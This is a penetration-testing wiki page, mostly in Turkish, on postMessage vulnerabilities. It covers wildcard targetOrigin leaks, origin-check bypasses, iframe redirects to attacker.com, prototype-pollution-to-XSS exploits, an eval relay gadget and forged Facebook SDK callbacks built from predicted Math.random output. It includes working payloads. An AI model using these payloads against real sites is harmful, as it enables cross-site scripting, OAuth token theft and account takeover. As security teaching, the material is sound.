# PostMessage Zafiyetleri

{{#include ../../banners/hacktricks-training.md}}

## **PostMessage** Gönderimi

**PostMessage** mesaj göndermek için aşağıdaki fonksiyonu kullanır:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
Unutmayın ki **targetOrigin** '\*' olabilir veya _https://company.com._ gibi bir URL olabilir.\
İkinci senaryoda, **mesaj yalnızca o domaine gönderilebilir** (Window nesnesinin origin'i farklı olsa bile).\
Eğer **wildcard** kullanılırsa, **mesajlar herhangi bir domaine gönderilebilir**, ve Window nesnesinin origin'ine gönderilir.

### iframe ve wildcard'a saldırı **targetOrigin** içinde

Bu [**raporda**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/) açıklandığı gibi, eğer bir sayfayı **iframed** edebiliyorsanız (no `X-Frame-Header` protection) ve bu sayfa **wildcard** (\*) kullanarak **postMessage** ile **hassas** mesaj gönderiyorsa, **değiştirerek** **iframe**'in **origin**'ini ve **hassas** mesajı sizin kontrolünüzdeki bir domaine **leak** edebilirsiniz.\
Not: sayfa iframelenebiliyorsa ama **targetOrigin** **bir URL olarak ayarlanmışsa ve wildcard olarak değilse**, bu **hile işe yaramaz**.
```html
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## addEventListener exploitation

**`addEventListener`** JS tarafından **`postMessages` bekleyen** fonksiyonu tanımlamak için kullanılan fonksiyondur.\
Aşağıdakine benzer bir kod kullanılacaktır:
```javascript
window.addEventListener(
"message",
(event) => {
if (event.origin !== "http://example.org:8080") return

// ...
},
false
)
```
Note in this case how the **first thing** that the code is doing is **checking the origin**. This is terribly **important** mainly if the page is going to do **anything sensitive** with the received information (like changing a password). **If it doesn't check the origin, attackers can make victims send arbitrary data to this endpoints** and change the victims passwords (in this example).

### Enumeration

In order to **find event listeners** in the current page you can:

- **Search** the JS code for `window.addEventListener` and `$(window).on` (_JQuery version_)
- **Execute** in the developer tools console: `getEventListeners(window)`

![](<../../images/image (618) (1).png>)

- **Go to** _Elements --> Event Listeners_ in the developer tools of the browser

![](<../../images/image (396).png>)

- Use a **browser extension** like [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) or [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker). This browser extensions will **intercept all the messages** and show them to you.

### Origin check bypasses

- **`event.isTrusted`** attribute is considered secure as it returns `True` only for events that are generated by genuine user actions. Though it's challenging to bypass if implemented correctly, its significance in security checks is notable.
- The use of **`indexOf()`** for origin validation in PostMessage events may be susceptible to bypassing. An example illustrating this vulnerability is:

```javascript
"https://app-sj17.marketo.com".indexOf("https://app-sj17.ma")
```

- The **`search()`** method from `String.prototype.search()` is intended for regular expressions, not strings. Passing anything other than a regexp leads to implicit conversion to regex, making the method potentially insecure. This is because in regex, a dot (.) acts as a wildcard, allowing for bypassing of validation with specially crafted domains. For instance:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```

- The **`match()`** function, similar to `search()`, processes regex. If the regex is improperly structured, it might be prone to bypassing.
- The **`escapeHtml`** function is intended to sanitize inputs by escaping characters. However, it does not create a new escaped object but overwrites the properties of the existing object. This behavior can be exploited. Particularly, if an object can be manipulated such that its controlled property does not acknowledge `hasOwnProperty`, the `escapeHtml` won't perform as expected. This is demonstrated in the examples below:

- Expected Failure:

```javascript
result = u({
message: "'\"<b>\\",
})
result.message // "&#39;&quot;&lt;b&gt;\"
```

- Bypassing the escape:

```javascript
result = u(new Error("'\"<b>\\"))
result.message // "'"<b>\"
```

In the context of this vulnerability, the `File` object is notably exploitable due to its read-only `name` property. This property, when used in templates, is not sanitized by the `escapeHtml` function, leading to potential security risks.

- The `document.domain` property in JavaScript can be set by a script to shorten the domain, allowing for more relaxed same-origin policy enforcement within the same parent domain.

### Origin-only trust + trusted relays

If a receiver only checks **`event.origin`** (e.g., trusts any `*.trusted.com`) you can often find a **"relay" page on that origin that echoes attacker-controlled params via `postMessage`** to a supplied `targetOrigin`/`targetWindow`. Examples include marketing/analytics gadgets that take query params and forward `{msg_type, access_token, ...}` to `opener`/`parent`. You can:

- **Open the victim page in a popup/iframe that has an `opener`** so its handlers register (many pixels/SDKs only attach listeners when `window.opener` exists).
- **Navigate another attacker window to the relay endpoint on the trusted origin**, populating message fields you want injected (message type, tokens, nonces).
- Because the message now comes **from the trusted origin**, origin-only validation passes and you can trigger privileged behaviors (state changes, API calls, DOM writes) in the victim listener.

Abuse patterns seen in the wild:

- Analytics SDKs (e.g., pixel/fbevents-style) consume messages like `FACEBOOK_IWL_BOOTSTRAP`, then **call backend APIs using a token supplied in the message** and include **`location.href` / `document.referrer`** in the request body. If you supply your own token, you can **read these requests in the token’s request history/logs** and exfil **OAuth codes/tokens** present in the URL/referrer of the victim page.
- Any relay that reflects arbitrary fields into `postMessage` lets you **spoof message types** expected by privileged listeners. Combine with weak input validation to reach Graph/REST calls, feature unlocks, or CSRF-equivalent flows.

Hunting tips: enumerate `postMessage` listeners that only check `event.origin`, then look for **same-origin HTML/JS endpoints that forward URL params via `postMessage`** (marketing previews, login popups, OAuth error pages). Stitch both together with `window.open()` + `postMessage` to bypass origin checks.

### e.origin == window.origin bypass

When embedding a web page within a **sandboxed iframe** using %%%%%%, it's crucial to understand that the iframe's origin will be set to null. This is particularly important when dealing with **sandbox attributes** and their implications on security and functionality.

By specifying **`allow-popups`** in the sandbox attribute, any popup window opened from within the iframe inherits the sandbox restrictions of its parent. This means that unless the **`allow-popups-to-escape-sandbox`** attribute is also included, the popup window's origin is similarly set to `null`, aligning with the iframe's origin.

Consequently, when a popup is opened under these conditions and a message is sent from the iframe to the popup using **`postMessage`**, both the sending and receiving ends have their origins set to `null`. This situation leads to a scenario where **`e.origin == window.origin`** evaluates to true (`null == null`), because both the iframe and the popup share the same origin value of `null`.

For more information **read**:


{{#ref}}
bypassing-sop-with-iframes-1.md
{{#endref}}

### Bypassing e.source

It's possible to check if the message came from the same window the script is listening in (specially interesting for **Content Scripts from browser extensions** to check if the message was sent from the same page):
```javascript
// If it’s not, return immediately.
if (received_message.source !== window) {
return
}
```
Bir mesajın **`e.source`** değerini null yapmak için, **postMessage** gönderen ve **hemen silinen** bir **iframe** oluşturabilirsiniz.

Daha fazla bilgi için **oku:**


{{#ref}}
bypassing-sop-with-iframes-2.md
{{#endref}}

### X-Frame-Header bypass

Bu saldırıları gerçekleştirmek için ideal olarak **kurban web sayfasını** bir `iframe` içine yerleştirebilirsiniz. Ancak `X-Frame-Header` gibi bazı header'lar bu davranışı **engelleyebilir**.\
Bu durumlarda yine daha az gizli bir saldırı kullanabilirsiniz. Zafiyetli web uygulamasını yeni bir sekmede açıp onunla iletişim kurabilirsiniz:
```html
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### Main sayfayı engelleyerek child iframe'e gönderilen mesajı çalmak

Aşağıdaki sayfada, veriler gönderilmeden önce **main** sayfayı **blocking** yaparak ve child içindeki bir **XSS**'i suistimal ederek **child iframe**'e gönderilen **hassas postmessage verisi**'ni, veri alınmadan önce **leak the data** şeklinde nasıl çalabileceğinizi görebilirsiniz:


{{#ref}}
blocking-main-page-to-steal-postmessage.md
{{#endref}}

### iframe konumunu değiştirerek mesajı çalmak

Eğer X-Frame-Header olmayan ve içinde başka bir iframe barındıran bir webpage'i iframeleyebiliyorsanız, o child iframe'in konumunu değiştirebilirsiniz; böylece eğer o iframe **wildcard** kullanılarak gönderilen bir **postmessage** alıyorsa, bir saldırgan o iframe'in **origin**'ini kendi kontrolündeki bir sayfaya değiştirip mesajı çalabilir:


{{#ref}}
steal-postmessage-modifying-iframe-location.md
{{#endref}}

### postMessage ile Prototype Pollution ve/veya XSS

`postMessage` ile gönderilen verinin JS tarafından çalıştırıldığı durumlarda, sayfayı iframe'leyip exploit'i `postMessage` ile göndererek **prototype pollution/XSS**'i suistimal edebilirsiniz.

`postMessage` yoluyla çok iyi açıklanmış birkaç XSS örneğini şu adreste bulabilirsiniz: [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)

Bir `iframe`'e `postMessage` yoluyla gönderilen veriyi kullanarak **Prototype Pollution and then XSS**'i suistimal eden bir exploit örneği:
```html
<html>
<body>
<iframe
id="idframe"
src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document
.getElementById("iframe_victim")
.contentWindow.postMessage(
'{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\" />"}}}',
"*"
)
document
.getElementById("iframe_victim")
.contentWindow.postMessage(JSON.stringify("refresh"), "*")
}

setTimeout(get_code, 2000)
</script>
</body>
</html>
```
Daha fazla bilgi için:

- İlgili sayfa: [**prototype pollution**](../deserialization/nodejs-proto-prototype-pollution/index.html)
- İlgili sayfa: [**XSS**](../xss-cross-site-scripting/index.html)
- İlgili sayfa: [**client side prototype pollution to XSS**](../deserialization/nodejs-proto-prototype-pollution/index.html#client-side-prototype-pollution-to-xss)

### Trusted-origin allowlist bir sınır değildir

Sıkı bir `event.origin` kontrolü ancak **trusted origin attacker JS çalıştıramıyorsa** işe yarar. Ayrıcalıklı sayfalar üçüncü taraf iframe'ler gömüp `event.origin === "https://partner.com"` ifadesinin güvenli olduğunu varsaydıklarında, `partner.com` içindeki herhangi bir XSS ebeveyn sayfaya bir köprü olur:
```javascript
// Parent (trusted page)
window.addEventListener("message", (e) => {
if (e.origin !== "https://partner.com") return
const [type, html] = e.data.split("|")
if (type === "Partner.learnMore") target.innerHTML = html // DOM XSS
})
```
Gerçek dünyada gözlemlenen saldırı deseni:

1. **Exploit XSS in the partner iframe** ve bir relay gadget yerleştir ki herhangi bir `postMessage` trusted origin içinde code exec'e dönüşsün:
```html
<img src="" onerror="onmessage=(e)=>{eval(e.data.cmd)};">
```
2. **Saldırgan sayfasından**, ele geçirilmiş iframe'e, izin verilen bir mesaj türünü ebeveyn pencereye ileten JS gönderin. Mesaj `partner.com`'dan kaynaklanır, allowlist'i geçer ve güvenli olmayan şekilde eklenen HTML taşır:
```javascript
postMessage({
cmd: `top.frames[1].postMessage('Partner.learnMore|<img src="" onerror="alert(document.domain)">|b|c', '*')`
}, "*")
```
3. Parent, saldırganın HTML'ini enjekte eder ve **JS execution in the parent origin** sağlar (ör. `facebook.com`); bu, OAuth kodlarını çalmak veya tam hesap ele geçirme akışlarına pivot yapmak için kullanılabilir.

Key takeaways:

- **Partner origin isn't a boundary**: "güvenilir" bir partnerdeki herhangi bir XSS, saldırganların `event.origin` kontrollerini atlayarak izin verilen mesajları göndermesine izin verir.
- Handlers that **render partner-controlled payloads** (ör. belirli mesaj tiplerinde `innerHTML`) partnerin ele geçirilmesini same-origin DOM XSS'e dönüştürür.
- Geniş bir **message surface** (çok sayıda tip, yapı validasyonu yok) partner iframe ele geçirildiğinde pivot için daha fazla gadget sağlar.

### postMessage köprülerinde **`Math.random()`** callback token'larını tahmin etme

Mesaj doğrulaması `Math.random()` ile üretilen bir “shared secret” kullandığında (ör. `guid() { return "f" + (Math.random() * (1<<30)).toString(16).replace(".", "") }`) ve aynı helper ayrıca plugin iframe'lerine isim verdiğinde, PRNG çıktıları geri elde edilip güvenilir mesajlar taklit edilebilir:

- **Leak PRNG outputs via `window.name`:** SDK, plugin iframe'lerini `guid()` ile otomatik isimlendirir. Eğer top frame'i kontrol ediyorsanız, hedef sayfayı iframe'e alın, sonra plugin iframe'ini kendi origin'inize yönlendirin (ör. `window.frames[0].frames[0].location='https://attacker.com'`) ve `window.frames[0].frames[0].name` okuyarak ham `Math.random()` çıktısı elde edin.
- **Force more outputs without reloads:** Bazı SDK'lar bir reinit yolu sunar; FB SDK'da `{xfbml:1}` ile `init:post` tetiklemek `XFBML.parse()`'i zorlar, plugin iframe'ini yok edip yeniden yaratır ve yeni isim/callback ID'leri üretir. Tekrarlı reinit ihtiyaç duyulan sayıda PRNG çıktısı üretir (callback/iframe ID'leri için ek dahili `Math.random()` çağrıları olduğunu unutmayın; çözücüler aradaki değerleri atlamalıdır).
- **Trusted-origin delivery via parameter pollution:** Eğer bir first-party plugin endpoint'i temizlenmemiş bir parametreyi cross-window payload içine yansıtıyorsa (ör. `/plugins/feedback.php?...%23relation=parent.parent.frames[0]%26cb=PAYLOAD%26origin=TARGET`), trusted `facebook.com` origin'i koruyarak `&type=...&iconSVG=...` enjekte edebilirsiniz.
- **Predict the next callback:** Sızdırılan iframe isimlerini `[0,1)` aralığındaki float'lara geri çevirin ve birkaç değeri (ardışık olmayanlar bile olabilir) bir V8 `Math.random` predictor'üne (ör. Z3 tabanlı) verin. Beklenen callback token'ını taklit etmek için yerelde bir sonraki `guid()`'i üretin.
- **Trigger the sink:** postMessage verisini, köprünün `xd.mpn.setupIconIframe` dispatch etmesine ve `iconSVG` içine HTML enjekte etmesine (ör. URL-encoded `<img src=x onerror=...>`) göre oluşturun; bu, hosting origin içinde DOM XSS ile sonuçlanır; buradan same-origin iframe'ler (OAuth dialog'ları, arbiters, vb.) okunabilir.
- **Framing quirks help:** Zincir framing gerektirir. Bazı mobil webview'larda, `frame-ancestors` mevcutken `X-Frame-Options` desteklenmeyen `ALLOW-FROM`'a gerileyebilir ve “compat” parametreleri permissive `frame-ancestors` uygulamaya zorlayarak `window.name` yan kanalını mümkün kılabilir.

#### Minimal forged message example
```javascript
// predictedFloat is the solver output for the next Math.random()
const callback = "f" + (predictedFloat * (1 << 30)).toString(16).replace(".", "")
const payload =
callback +
"&type=mpn.setupIconIframe&frameName=x" +
"&iconSVG=%3cimg%20src%3dx%20onerror%3dalert(document.domain)%3e"
const fbMsg = `https://www.facebook.com/plugins/feedback.php?api_key&channel_url=https://staticxx.facebook.com/x/connect/xd_arbiter/?version=42%23relation=parent.parent.frames[0]%26cb=${encodeURIComponent(payload)}%26origin=https://www.facebook.com`
iframe.location = fbMsg // sends postMessage from facebook.com with forged callback
```
## Referanslar

- [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)
- [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
- [Leaking fbevents: OAuth code exfiltration via postMessage trust leading to Instagram ATO](https://ysamm.com/uncategorized/2026/01/16/leaking-fbevents-ato.html)
- Pratik için: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)
- [Self XSS Facebook Payments](https://ysamm.com/uncategorized/2026/01/15/self-xss-facebook-payments.html)
- [Facebook JavaScript SDK Math.random callback prediction → DOM XSS writeup](https://ysamm.com/uncategorized/2026/01/17/math-random-facebook-sdk.html)
- [V8 Math.random() state recovery (Z3 predictor)](https://github.com/PwnFunction/v8-randomness-predictor)

{{#include ../../banners/hacktricks-training.md}}
